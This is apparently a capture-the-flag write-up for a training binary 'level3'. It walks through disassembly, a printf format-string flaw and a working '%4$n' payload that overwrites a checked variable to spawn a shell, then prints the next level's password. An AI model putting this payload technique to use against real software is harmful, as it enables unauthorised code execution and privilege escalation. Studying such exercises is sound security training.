> ./level3
>r
r

# Disas binary
objdump -d level3

# We read the function V, here a few interessting line
804850c:	c7 04 24 0d 86 04 08 	movl   $0x804860d,(%esp) # >x /s 0x804860d -> 0x804860d:	 "/bin/sh" üëÄ

 80484da:	a1 8c 98 04 08       	mov    0x804988c,%eax 
 80484df:	83 f8 40             	cmp    $0x40,%eax       # Cmp %eax with 0x40(64 in dec)
 80484e2:	75 34                	jne    8048518 <v+0x74> # Jump to the end in not cmp
 
 # So I guess If 0x804988c containt 0x40 for the cmp we will open a shell
 
 80484a4:	55                   	push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	81 ec 18 02 00 00    	sub    $0x218,%esp
 80484ad:	a1 60 98 04 08       	mov    0x8049860,%eax
 80484b2:	89 44 24 08          	mov    %eax,0x8(%esp)
 80484b6:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp) # p 0x200 -> 512 <- buff size 
 80484bd:	00
 80484be:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484c4:	89 04 24             	mov    %eax,(%esp)
 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>   # fgets() of a buff size 
 80484cc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484d2:	89 04 24             	mov    %eax,(%esp)
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt> # printf fgets content
 
 # printf is weak to format string exploit (https://owasp.org/www-community/attacks/Format_string_attack)
 
> ./level3
> aaaa %p %p %p %p %p
aaaa 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 0x20702520 # 0x61616161 is the hexa for aaaa

# ‚Äù%n‚Äù 	Writes the number of characters into a pointer, So we will write at the adrr of the var we cmp (see l12)
# The modifier format %x allow us to print address on the stack, cast on unsigned hexadecimal integer
echo -e "\x8c\x98\x04\x08 %p %p %p %p" | ./level3
ÔøΩ 0x200 0xb7fd1ac0 0xb7ff37d0 0x804988c <- HERE

# TIME TO GO BRRRRRR
[Endian Address of the var][padding][write nb bytes at addrr]
[\x8c\x98\x04\x08][A * 60][%4$n]  # %[number]$n -> [number]$, specify the position of address where we will write

> (python -c 'print "\x8c\x98\x04\x08" + "a"*60 + "%4$n"'; cat) | ./level3
ÔøΩAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
> cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

# BRRRRRRRRRRRR

 
